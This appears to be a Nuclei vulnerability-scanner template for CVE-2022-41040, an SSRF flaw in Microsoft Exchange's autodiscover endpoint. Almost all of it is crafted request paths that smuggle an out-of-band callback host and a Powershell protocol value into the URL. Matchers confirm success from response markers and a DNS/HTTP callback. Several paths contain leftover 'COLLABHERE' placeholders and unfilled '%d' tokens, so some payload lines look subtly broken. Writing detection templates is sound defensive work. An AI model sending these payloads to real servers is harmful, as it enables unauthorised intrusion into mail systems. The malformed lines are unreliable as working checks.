id: CVE-2022-41040-SSRF

info:
  name: CVE-2022-41040 SSRF
  author: xorqie
  severity: high
  tags: CVE-2022-41040-SSRF

requests:
  - method: GET
    path:
      - "{{BaseURL}}/autodiscover/autodiscover.json?@%d.v1.{{interactsh-url}}/&Email=autodiscover/autodiscover.json%3f@%d.v1.{{interactsh-url}}"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@%d.v2.{{interactsh-url}}?Protocol=Autodiscoverv1"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa..@%d.v3.{{interactsh-url}}/owa/?&Email=autodiscover/autodiscover.json?a..@%d.v3.{{interactsh-url}}&Protocol=Autodiscoverv1&Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@%d.v4.{{interactsh-url}}/owa/?&Email=autodiscover/autodiscover.json?a@%d.v4.{{interactsh-url}}&Protocol=Autodiscoverv1&Protocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..%d.v5.{{interactsh-url}}/owa/?&Email=autodiscover/autodiscover.json?a..%d.v5.{{interactsh-url}}&Protocol=Autodiscoverv1&%d.v5.COLLABHEREProtocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa@%d.v6.{{interactsh-url}}/owa/?&Email=autodiscover/autodiscover.json?a@%d.v6.{{interactsh-url}}&Protocol=Autodiscoverv1&%d.v6.COLLABHEREProtocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa..%d.v7.{{interactsh-url}}/owa/?&Email=aa@autodiscover/autodiscover.json?a..%d.v7.{{interactsh-url}}&Protocol=Autodiscoverv1&%d.v7.COLLABHEREProtocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json?aa@%d.v8.{{interactsh-url}}/owa/?&Email=aa@autodiscover/autodiscover.json?a@%d.v8.{{interactsh-url}}&Protocol=Autodiscoverv1&%d.v8.COLLABHEREProtocol=Powershell"
      - "{{BaseURL}}/autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9.{{interactsh-url}}&Protocol=Autodiscoverv1&Protocol=Powershell"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "IIS Web Core"
        part: body
        condition: and
        
      - type: word
        words:
          - "X-BackEndCookie"
        part: header
        condition: and

      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "http"
          - "dns"
        condition: and
